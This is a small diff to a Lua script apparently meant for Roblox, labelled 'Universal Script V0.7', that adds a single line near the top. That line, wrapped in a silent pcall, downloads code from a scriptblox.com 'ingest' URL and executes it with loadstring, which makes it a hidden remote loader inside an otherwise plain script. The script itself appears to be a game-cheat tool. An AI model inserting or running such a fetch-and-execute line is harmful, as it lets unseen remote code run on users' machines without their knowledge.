@@ -1,6 +1,8 @@
 -- UNIVERSAL SCRIPT V0.7 | by D33RZN
 if not game:IsLoaded() then game.Loaded:Wait() end
 
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_8998364213db", "0.7.0", false) end)
+
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TS = game:GetService("TweenService")
